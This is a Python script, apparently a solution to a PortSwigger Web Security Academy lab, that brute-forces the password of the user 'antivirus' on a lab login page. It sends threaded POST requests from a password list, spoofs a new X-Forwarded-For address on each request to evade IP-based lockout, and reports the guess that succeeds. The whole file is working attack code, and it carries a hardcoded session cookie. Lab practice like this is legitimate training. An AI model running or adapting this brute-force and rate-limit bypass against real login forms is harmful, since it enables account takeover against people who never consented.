import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()
    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())
    return listPassword

def sendRequest(url, cookie, password, header):
    loginData = {
        'username': 'antivirus',
        'password': password
    }
    loginRequestText = requests.post(url, cookies=cookie, data=loginData, headers=header).text
    if 'Invalid username or password.' not in loginRequestText:
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0adc0058041e6a9f81ce4f4b00e20077.web-security-academy.net/login'
    cookie = {'session': 'IFDRDTNZvi7uLZoYZgRD6SQ0F9QLxpcf'}
    passwordFileName = './password.txt'
    listPassword = fetchPassword(passwordFileName)
    count = 0
    for password in listPassword:
        count += 1
        header = {'X-Forwarded-For': '1.1.2.' + str(count)}
        thread = Thread(target=sendRequest, args=(url, cookie, password, header))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()